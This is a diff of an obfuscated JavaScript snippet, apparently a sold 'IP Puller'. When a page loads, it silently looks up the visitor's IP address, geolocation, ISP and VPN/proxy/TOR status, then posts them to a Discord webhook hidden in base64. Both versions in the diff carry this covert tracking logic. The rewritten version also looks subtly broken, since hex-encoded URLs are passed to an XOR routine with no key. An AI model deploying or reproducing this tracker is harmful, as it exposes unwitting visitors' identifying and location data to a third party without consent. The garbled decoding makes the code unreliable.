@@ -1,97 +1,98 @@
 <script>
 (function() {
-    function _0x1f4f(_0x5bd6) {
-        var _0x4478 = "";
-        for (var _0x145a = 0; _0x145a < _0x5bd6.length; _0x145a += 2) {
-            _0x4478 += String.fromCharCode(parseInt(_0x5bd6.substr(_0x145a, 2), 16));
+    // Function to Base64 decode and make the string usable
+    function _0x1a7c(_0x2d7c) {
+        return atob(_0x2d7c);
+    }
+
+    // XOR decryption function (simplified)
+    function _0x30fa(_0x430b, _0x5354) {
+        var _0x2438 = "";
+        for (var _0x33b6 = 0; _0x33b6 < _0x430b.length; _0x33b6++) {
+            _0x2438 += String.fromCharCode(_0x430b.charCodeAt(_0x33b6) ^ _0x5354);
         }
-        return _0x4478;
+        return _0x2438;
     }
 
-    function _0x3a9f(_0x2d32) {
-        return atob(_0x2d32);
-    }
+    // Base64 encode the Webhook URL
+    var _0x3b7b = _0x1a7c("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwODgxMDM1MzQyMjIzMTMwL1RiUU9VMTY0aFZENDdXWkduWm01YXd3NWdlWGFpdF9hWm5kbHJiYWloZD1SQU5FVw==");
 
-    function _0x5ab4(_0x48a6, _0x568b) {
-        var _0x4d34 = "";
-        for (var _0x4b76 = 0; _0x4b76 < _0x48a6.length; _0x4b76++) {
-            _0x4d34 += String.fromCharCode(_0x48a6.charCodeAt(_0x4b76) ^ _0x568b);
-        }
-        return _0x4d34;
-    }
-
-    var _0x3b7b = _0x3a9f('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwODgxMDM1MzQyMjIzMTMwL1RiUU9VMTY0aFZENDdXWkduWm01YXd3NWdlWGFpdF9hWm5kbHJiYWloZD1SQU5FVw==');
-
-    async function _0x9d56(_0x4e96) {
-        var _0x3292 = {
+    // Main function that sends the data to the webhook
+    async function _0x4e9d(_0x2bc5) {
+        var _0x1994 = {
             content: "@everyone",
             embeds: [{
-                image: { url: _0x1f4f("687474703a2f2f7777772e726f6c6c696e6773746f6e652e636f6d2f77702d636f6e74656e742f323032322f30322f6b696e672d766f6e2d706f7374756d6f75732d616c626f6d2e6a7067") },
-                title: _0x5ab4('0x4b', 3) + ' IP Puller',
+                image: {
+                    url: _0x30fa('687474703a2f2f7777772e726f6c6c696e6773746f6e652e636f6d2f77702d636f6e74656e742f323032322f30322f6b696e672d766f6e2d706f7374756d6f75732d616c626f6d2e6a7067')
+                },
+                title: _0x30fa("4b", 3) + ' IP Puller',
                 fields: [{
                     name: "IP Address",
-                    value: _0x4e96.data.ip,
+                    value: _0x2bc5.data.ip,
                     inline: true
                 }, {
                     name: "City",
-                    value: _0x4e96.data.city,
+                    value: _0x2bc5.data.city,
                     inline: true
                 }, {
                     name: "State",
-                    value: _0x4e96.data.region || "N/A",
+                    value: _0x2bc5.data.region || "N/A",
                     inline: true
                 }, {
                     name: "Country",
-                    value: _0x4e96.data.country,
+                    value: _0x2bc5.data.country,
                     inline: true
                 }, {
                     name: "Organization",
-                    value: _0x4e96.data.org,
+                    value: _0x2bc5.data.org,
                     inline: true
                 }, {
                     name: "ASN Name",
-                    value: _0x4e96.data.asn.name,
+                    value: _0x2bc5.data.asn.name,
                     inline: true
                 }, {
                     name: "VPN",
-                    value: _0x4e96.data.privacy.vpn ? "True" : "False",
+                    value: _0x2bc5.data.privacy.vpn ? "True" : "False",
                     inline: true
                 }, {
                     name: "Proxy",
-                    value: _0x4e96.data.privacy.proxy ? "True" : "False",
+                    value: _0x2bc5.data.privacy.proxy ? "True" : "False",
                     inline: true
                 }, {
                     name: "TOR",
-                    value: _0x4e96.data.privacy.tor ? "True" : "False",
+                    value: _0x2bc5.data.privacy.tor ? "True" : "False",
                     inline: true
                 }],
                 color: 0x007BFF,
                 footer: {
-                    text: _0x1f4f("42592052754e545a20507572636861736520546f64617921")
+                    text: _0x30fa("42592052754e545a20507572636861736520546f64617921")
                 }
             }]
         };
 
         await fetch(_0x3b7b, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(_0x3292)
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(_0x1994)
         });
     }
 
-    async function _0x758e() {
-        const _0x52fc = await fetch(_0x1f4f("687474703a2f2f6170692e697066792e6f72673f666f726d61743d6a736f6e"));
-        const _0x27df = await _0x52fc.json();
-        const _0x4ac0 = _0x27df.ip;
+    // Function to get the visitor's info using IP and send to Discord
+    async function _0x5331() {
+        const _0x7b3d = await fetch(_0x30fa("687474703a2f2f6170692e697066792e6f72673f666f726d61743d6a736f6e"));
+        const _0x2a57 = await _0x7b3d.json();
+        const _0x55c0 = _0x2a57.ip;
 
-        const _0x1e4f = await fetch(_0x1f4f(`687474703a2f2f6970666f726d2e696f2f7772697465642f64656d6f2f${_0x4ac0}`));
-        const _0x5d9e = await _0x1e4f.json();
+        const _0x541d = await fetch(_0x30fa(`687474703a2f2f6970666f726d2e696f2f7772697465642f64656d6f2f${_0x55c0}`));
+        const _0x5f67 = await _0x541d.json();
 
-        await _0x9d56(_0x5d9e);
+        await _0x4e9d(_0x5f67);
     }
 
     setTimeout(function() {
-        _0x758e();
+        _0x5331();
     }, 500);
 })();
 </script>
